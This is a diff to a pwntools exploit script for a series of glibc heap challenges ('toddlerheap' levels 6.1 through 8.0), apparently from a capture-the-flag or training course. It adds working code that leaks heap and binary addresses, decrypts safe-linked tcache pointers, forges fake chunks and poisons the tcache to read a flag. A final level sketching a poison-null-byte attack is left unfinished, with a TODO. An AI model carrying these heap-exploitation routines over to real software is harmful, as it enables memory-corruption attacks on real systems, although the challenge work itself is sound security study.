@@ -36,7 +36,13 @@ def decrypt_tcache(encrypted_address):
     return decrypted
 
 def prepare(p):
-    p.recvuntil(b'quit):')
+    p.recvuntil(b'quit): ')
+
+def read_copy(p, id, data):
+    prepare(p)
+    p.sendline('read_copy')
+    p.sendline(id)
+    p.sendline(data)
 
 def read_to_global(p, data):
     prepare(p)
@@ -300,14 +306,203 @@ def level6_0(p):
     safer_read(p, '0', b'A'*24)
     puts_id(p, b'0')
 
+def level6_1(p):
+    ''''''
+    # Get BSS Leak
+    p.recvuntil('flag into ')
+    flag_leak = int(p.recvline().strip()[:-1], 16)
+    print(f'flag/bss leak: {hex(flag_leak)}')
+    binary_base = flag_leak - 0x42b8
+    print(f'binary base: {hex(binary_base)}')
 
-level = 'level6.0'
-p = process(f'/challenge/toddlerheap_{level}')
+    # Leak Heap
+    for id in range(10):
+        calloc_id(p, str(id), b'24')
+
+    for id in range(10):
+        free_id(p, str(id))
+
+    puts_id(p, '8')
+    p.recvuntil('Data: ')
+    heap_leak = p.recvline().strip()
+    if len(heap_leak) < 6:
+        print("bad address, try again")
+        exit(1)
+
+    heap_leak  = u64(heap_leak.ljust(8, b'\x00'))
+    print(f'encrypted heap leak: {hex(heap_leak)}')
+    decrypted_heap = decrypt_tcache(heap_leak)
+    print(f'decrypted heap base: {hex(decrypted_heap)}')
+    heap_key = decrypted_heap >> 12
+
+    read_start = binary_base + 0x4200
+    print(f'read start: {hex(read_start)}')
+
+
+    distance_to_flag = flag_leak - read_start
+    '''make a fake chunk at the flag location'''
+
+    read_to_global(p, b'A'*(distance_to_flag-0x20) + p64(0x21))
+    
+    encrypted_flag_chunk = (flag_leak-0x28) ^ heap_key
+    safer_read(p, '9', p64(encrypted_flag_chunk))
+
+    # Get our fake chunk and fill it with data so that it hits the flag, then print
+    # Couldn't just allocate on the flag due to calloc
+    calloc_id(p, '0', '24')
+    calloc_id(p, '0', '24')
+    safer_read(p, '0', b'A'*24)
+    puts_id(p, b'0')
+
+def level7_0(p):
+    '''Chunk sizes are placed close to the flag... this could allow us to create a fake chunk
+
+    For example, requesting a size 33 chunks results in a 0x21 size field being placed in the alloc_struct.
+    We could just request a size 33 chunk in index 16 and that should do the job.
+    '''
+    p.recvuntil('flag into ')
+    flag_leak = int(p.recvline().strip()[:-1], 16)
+
+    print(f'flag/bss leak: {hex(flag_leak)}')
+    binary_base = flag_leak - 0x4218
+    print(f'binary base: {hex(binary_base)}')
+
+    # Leak Heap
+    for id in range(10):
+        calloc_id(p, str(id), b'24')
+
+    for id in range(10):
+        free_id(p, str(id))
+
+    puts_id(p, '8')
+    p.recvuntil('Data: ')
+    heap_leak = p.recvline().strip()
+    if len(heap_leak) < 6:
+        print("bad address, try again")
+        exit(1)
+
+    heap_leak  = u64(heap_leak.ljust(8, b'\x00'))
+    print(f'encrypted heap leak: {hex(heap_leak)}')
+    decrypted_heap = decrypt_tcache(heap_leak)
+    print(f'decrypted heap base: {hex(decrypted_heap)}')
+    heap_key = decrypted_heap >> 12
+
+    calloc_id(p, '10', b'33') # size field for our fake chunk ends up in tracker before flag
+
+    encrypted_flag_chunk = (flag_leak-0x28) ^ heap_key
+    safer_read(p, '9', p64(encrypted_flag_chunk))
+
+    calloc_id(p, '0', '24')
+    calloc_id(p, '0', '24')
+    safer_read(p, '0', 'A'*24)
+
+    puts_id(p, '0')
+
+def level7_1(p):
+    ''''''
+    p.recvuntil('flag into ')
+    flag_leak = int(p.recvline().strip()[:-1], 16)
+
+    print(f'flag/bss leak: {hex(flag_leak)}')
+    binary_base = flag_leak - 0x4218
+    print(f'binary base: {hex(binary_base)}')
+
+    # Leak Heap
+    for id in range(10):
+        calloc_id(p, str(id), b'24')
+
+    for id in range(10):
+        free_id(p, str(id))
+
+    puts_id(p, '8')
+    p.recvuntil('Data: ')
+    heap_leak = p.recvline().strip()
+    if len(heap_leak) < 6:
+        print("bad address, try again")
+        exit(1)
+
+    heap_leak  = u64(heap_leak.ljust(8, b'\x00'))
+    print(f'encrypted heap leak: {hex(heap_leak)}')
+    decrypted_heap = decrypt_tcache(heap_leak)
+    print(f'decrypted heap base: {hex(decrypted_heap)}')
+    heap_key = decrypted_heap >> 12
+
+    calloc_id(p, '10', b'33') # size field for our fake chunk ends up in tracker before flag
+
+    encrypted_flag_chunk = (flag_leak-0x28) ^ heap_key
+    safer_read(p, '9', p64(encrypted_flag_chunk))
+
+    calloc_id(p, '0', '24')
+    calloc_id(p, '0', '24')
+    safer_read(p, '0', 'A'*24)
+
+    puts_id(p, '0')
+
+def level8_0(p):
+    '''I believe vuln is null terminator being added after length of read... off by one.
+
+    This could potentially be leveraged into poison null byte or House of Ein.
+
+    Yup that's the deal, overwrote the size field of next chunk.
+
+    Can use read_flag to get the flag addr.
+
+    allocate big chunk (0x400)
+    allocate small chunk
+    allocate big chunk (0x400)
+    allocate another small chunk so two chunks in tcache (same size)
+    allocate guard chunk
+
+    Use second chunk to overwrite prev inuse flag within second big chunk.
+    Set prev size field (now in second chunk) to size of first + second chunks.
+    Free third chunk causing consolidation with first chunk.
+    Request enough data to get the new big chunk
+    Free second small chunk then first small chunk... now the first small chunk we overlap
+    has heap pointers in it. 
+    Fill new big chunk with data up until the heap pointers in the second chunk. Leak it.
+    De-obfuscate to get our obfuscation key.
+    Overwrite pointer with pointer to the flag.
+    
+    Allocate, allocate, win.
+
+    Took a look at 8.1, we'll need to base the flag addr off of heap leak as addresses are no longer printed.
+    Let's just knock that out now so 8.1 is a freebie.
+
+    !!!!!!!
+    To get a leak we need to consolidate... can't consolidate without a leak...
+    Unless we do poison null byte, so let's switch to that.
+    !!!!!!!
+
+    '''
+    read_flag(p) # Do this early to make calculation off heap base easy
+
+    malloc_id(p, '0', str(0x18)) # For overflow into chunk 2
+    # Need next chunk to be big enough to contain a non-tcache chunk + another chunk
+    malloc_id(p, '1', str(0x480)) # Overflow into this, removing the last byte of size
+    malloc_id(p, '2', str(0x410)) # For Consolidation with chunk 1, resulting in overlap of sub-chunk within 1
+    malloc_id(p, '3', str(0x18)) # Guard
+    
+    # Write fake next size into chunk 1 where our tcache chunk will end up
+    # Also need to setup the prev size of the tcache chunk
+    # TODO: Figure out math
+    read_copy(p, '1', b'A'*0x408 + p64(0x51))
+
+    # Free chunk 1 to set chunk 2's prev size field
+    free_id(p, '1')
+    # Overflow chunk 0 so that chunk 1 shrinks. Now chunk 2's prevsize won't get updated properly
+    read_copy(p, '0', 'A'*0x18)
+    # Allocate two chunks from chunk 1, one in tcache to use for poisoning
+    malloc_id(p, '4', str(0x420))
+
+
+
+level = 'level8.0'
+#p = process(f'/challenge/toddlerheap_{level}')
 #p = process(['./ld-2.35.so', f'./toddlerheap_{level}'])
-#p = gdb.debug(['./ld-2.35.so',  f'./toddlerheap_{level}'], gdbscript='''
-#c            
-#''')
+p = gdb.debug(['./ld-2.35.so',  f'./toddlerheap_{level}'], gdbscript='''
+c            
+''')
 
 
-level6_0(p)
+level8_0(p)
 p.interactive()
